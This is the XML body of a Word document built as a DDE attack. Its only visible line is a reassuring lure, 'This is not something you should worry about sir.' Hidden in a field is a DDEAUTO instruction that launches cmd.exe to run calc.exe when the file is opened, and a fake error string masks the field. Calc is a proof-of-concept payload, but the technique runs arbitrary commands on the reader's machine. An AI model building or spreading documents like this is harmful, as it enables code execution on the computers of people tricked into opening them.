<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:wpc="http://schemas.microsoft.com/office/word/2010/wordprocessingCanvas" xmlns:cx="http://schemas.microsoft.com/office/drawing/2014/chartex" xmlns:cx1="http://schemas.microsoft.com/office/drawing/2015/9/8/chartex" xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:m="http://schemas.openxmlformats.org/officeDocument/2006/math" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:wp14="http://schemas.microsoft.com/office/word/2010/wordprocessingDrawing" xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing" xmlns:w10="urn:schemas-microsoft-com:office:word" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:w14="http://schemas.microsoft.com/office/word/2010/wordml" xmlns:w15="http://schemas.microsoft.com/office/word/2012/wordml" xmlns:w16se="http://schemas.microsoft.com/office/word/2015/wordml/symex" xmlns:wpg="http://schemas.microsoft.com/office/word/2010/wordprocessingGroup" xmlns:wpi="http://schemas.microsoft.com/office/word/2010/wordprocessingInk" xmlns:wne="http://schemas.microsoft.com/office/word/2006/wordml" xmlns:wps="http://schemas.microsoft.com/office/word/2010/wordprocessingShape" mc:Ignorable="w14 w15 w16se wp14"><w:body><w:p w:rsidR="00A6196A" w:rsidRDefault="007D377E"><w:pPr><w:rPr><w:sz w:val="36"/></w:rPr></w:pPr><w:r w:rsidRPr="007D377E"><w:rPr><w:sz w:val="36"/></w:rPr><w:t>This is not something you should worry about sir.</w:t></w:r></w:p><w:p w:rsidR="00D2773D" w:rsidRDefault="00D2773D"><w:pPr><w:rPr><w:sz w:val="36"/></w:rPr></w:pPr><w:bookmarkStart w:id="0" w:name="_GoBack"/><w:bookmarkEnd w:id="0"/></w:p><w:p w:rsidR="007D377E" w:rsidRPr="007D377E" w:rsidRDefault="007D377E"><w:pPr><w:rPr><w:sz w:val="36"/></w:rPr></w:pPr><w:r><w:rPr><w:sz w:val="36"/></w:rPr><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:rPr><w:sz w:val="36"/></w:rPr><w:instrText xml:space="preserve"> </w:instrText></w:r><w:r w:rsidRPr="007D377E"><w:rPr><w:sz w:val="36"/></w:rPr><w:instrText>DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe"</w:instrText></w:r><w:r><w:rPr><w:sz w:val="36"/></w:rPr><w:instrText xml:space="preserve"> </w:instrText></w:r><w:r><w:rPr><w:sz w:val="36"/></w:rPr><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:rPr><w:b/><w:noProof/><w:sz w:val="36"/></w:rPr><w:t>!Unexpected End of Formula</w:t></w:r><w:r><w:rPr><w:sz w:val="36"/></w:rPr><w:fldChar w:fldCharType="end"/></w:r></w:p><w:sectPr w:rsidR="007D377E" w:rsidRPr="007D377E"><w:pgSz w:w="12240" w:h="15840"/><w:pgMar w:top="1440" w:right="1440" w:bottom="1440" w:left="1440" w:header="720" w:footer="720" w:gutter="0"/><w:cols w:space="720"/><w:docGrid w:linePitch="360"/></w:sectPr></w:body></w:document>